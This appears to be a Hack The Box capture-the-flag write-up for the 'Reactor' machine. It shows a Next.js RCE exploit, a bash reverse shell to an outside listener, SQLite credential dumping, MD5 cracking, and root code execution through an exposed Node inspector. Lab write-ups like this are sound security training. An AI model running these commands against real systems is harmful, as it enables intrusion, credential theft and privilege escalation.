# 🚀 Hack The Box -  Reactor Write-up

### **Machine Information**
| Machine Name | Target IP | Difficulty | Focus Service | Status |
| :--- | :--- | :--- | :--- | :--- |
| **Reactor** | `10.129.3.103`| Easy | Linux | **SOLVED** ✅ |

<img width="876" height="588" alt="Screenshot 2026-05-25 235356" src="https://github.com/user-attachments/assets/ebda7ca8-5678-4581-b763-c8023c1c9c1d" />



---

# 📌 Attack Chain

```text
Next.js RCE
→ Reverse Shell
→ SQLite Looting
→ MD5 Hash Cracking
→ SSH Access
→ Node Inspector Abuse
→ Root
```

---

# 1️⃣ Reconnaissance

## Initial Nmap Scan

An initial scan was performed to identify exposed services.

```bash
nmap -sV -sC 10.129.3.194
```

<img width="1400" height="500" alt="nmap-scan" src="https://github.com/user-attachments/assets/example1.png" />

### Open Ports

| Port | Service | Version |
| :--- | :------ | :------ |
| 22   | SSH     | OpenSSH |
| 3000 | HTTP    | Next.js |

---

# 2️⃣ Web Enumeration

Visiting the web application:

```text
http://10.129.3.194:3000
```

The application exposed a monitoring dashboard named:

```text
ReactorWatch
```

<img width="1500" height="700" alt="reactor-dashboard" src="https://github.com/user-attachments/assets/example2.png" />

---

## Framework Identification

Inspecting the page source revealed:

```javascript
self.__next_f.push(...)
```

This confirmed usage of:

* Next.js
* React Server Components (RSC)
* App Router architecture

Version identified:

```text
Next.js 15.0.3
```

---

# 3️⃣ Vulnerability Identification

The target version was vulnerable to:

```text
CVE-2025-55182
```

Also known as:

```text
React2Shell
```

This vulnerability allows unauthenticated Remote Code Execution through unsafe deserialization inside React Server Components.

<img width="1600" height="800" alt="cve-info" src="https://github.com/user-attachments/assets/example3.png" />

---

# 4️⃣ Exploitation

## Testing Remote Code Execution

A public exploit was used:

```bash
node exploit.js http://10.129.3.194:3000 "whoami"
```

<img width="1500" height="500" alt="rce-test" src="https://github.com/user-attachments/assets/example4.png" />

### Payload Explanation

The exploit internally executed:

```javascript
process.mainModule.require("child_process").execSync("whoami")
```

Explanation:

| Function      | Purpose                     |
| :------------ | :-------------------------- |
| process       | Main Node.js runtime object |
| require       | Import internal modules     |
| child_process | Execute Linux commands      |
| execSync      | Run command synchronously   |

---

# 5️⃣ Reverse Shell

## Starting Listener

```bash
nc -lvnp 4444
```

## Sending Reverse Shell Payload

```bash
node exploit.js http://10.129.3.194:3000 "bash -c 'bash -i >& /dev/tcp/10.10.14.172/4444 0>&1'"
```

<img width="1600" height="500" alt="reverse-shell" src="https://github.com/user-attachments/assets/example5.png" />

Successful connection:

```text
node@reactor:/opt/reactor-app$
```

---

# 6️⃣ Stabilizing Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

This provided a fully interactive TTY shell.

---

# 7️⃣ Database Enumeration

Searching for database files:

```bash
find / -name "*.db" 2>/dev/null
```

Discovered:

```text
reactor.db
```

---

## SQLite Enumeration

```bash
sqlite3 reactor.db
```

### Enumerating Tables

```sql
.tables
```

### Dumping User Data

```sql
select * from users;
```

<img width="1300" height="400" alt="sqlite-users" src="https://github.com/user-attachments/assets/example6.png" />

Result:

```text
2|engineer|39d97110eafe2a9a68639812cd271e8e
```

---

# 8️⃣ Hash Cracking

## Cracking MD5 Hash

```bash
john --format=Raw-MD5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Recovered password:

```text
reactor1
```

<img width="1400" height="400" alt="john-crack" src="https://github.com/user-attachments/assets/example7.png" />

---

# 9️⃣ SSH Access

```bash
ssh engineer@10.129.3.194
```

Password:

```text
reactor1
```

---

# 🔟 Privilege Escalation

## Process Enumeration

```bash
ps aux | grep node
```

Interesting process:

```text
root /usr/bin/node --inspect=127.0.0.1:9229
```

<img width="1600" height="500" alt="node-inspector" src="https://github.com/user-attachments/assets/example8.png" />

---

## Socket Enumeration

```bash
ss -lntp
```

Discovered:

```text
127.0.0.1:9229
```

### Why Important?

The Node Inspector allows remote JavaScript execution inside the root-owned process.

---

# 1️⃣1️⃣ SSH Port Forwarding

```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.3.194
```

Tunnel created:

```text
Kali:9229 → Target:127.0.0.1:9229
```

---

# 1️⃣2️⃣ Attaching to Node Inspector

```bash
node inspect 127.0.0.1:9229
```

---

# 1️⃣3️⃣ Root Code Execution

Inside the debugger:

```javascript
exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")
```

<img width="1600" height="500" alt="root-shell" src="https://github.com/user-attachments/assets/example9.png" />

---

# 🏁 Root Flag

```bash
cat /root/root.txt
```

Root access successfully obtained.

---

# 📚 Key Takeaways

| Topic                | Skill Learned           |
| :------------------- | :---------------------- |
| Next.js RCE          | Framework exploitation  |
| Reverse Shell        | Initial foothold        |
| SQLite Enumeration   | Credential harvesting   |
| MD5 Cracking         | Password recovery       |
| SSH Tunneling        | Internal service access |
| Node Inspector Abuse | Privilege escalation    |

---

# ✅ Machine Solved

```text
User Flag  : Captured
Root Flag  : Captured
```

---

### Documented by

```text
Pagar Kristian Panjaitan
```



UpComing [Machine active]






---
**Documented by**: Pagar Kristian Panjaitan
